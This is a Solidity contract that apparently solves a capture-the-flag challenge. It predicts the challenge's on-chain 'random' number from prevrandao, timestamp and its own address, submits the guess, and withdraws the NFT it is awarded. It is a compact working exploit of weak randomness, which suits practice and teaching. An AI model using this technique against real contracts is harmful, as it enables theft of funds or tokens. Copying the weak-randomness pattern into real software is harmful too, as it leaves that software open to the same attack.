// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {ERC721Holder} from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {S4} from "../challenges/S4.sol";

contract Solution4 is ERC721Holder {
    error Solution4__SolveFailed();
    error Solution4__IncorrectOwnedTokenId();
    S4 public immutable i_challenge;
    IERC721 public immutable i_nft;

    constructor(S4 _challenge, IERC721 _nft) {
        i_challenge = (_challenge);
        i_nft = _nft;
    }

    function owner() external view returns (address) {
        return address(this);
    }

    function go() external {
        i_challenge.solveChallenge(_calcGuessRng(), "thecil_eth");
    }

    function solve() external {
        i_challenge.solveChallenge(_calcGuessRng(), "thecil_eth");
    }

    function withdrawNft(uint256 _tokenId) external {
        if (i_nft.ownerOf(_tokenId) != address(this)) {
            revert Solution4__IncorrectOwnedTokenId();
        }
        i_nft.safeTransferFrom(address(this), msg.sender, _tokenId, "");
    }

    function _calcGuessRng() private view returns (uint256 guess_rng) {
        // slither-disable-next-line weak-prng
        guess_rng =
            uint256(
                keccak256(
                    abi.encodePacked(
                        address(this),
                        block.prevrandao,
                        block.timestamp
                    )
                )
            ) %
            1_000_000;
    }
}
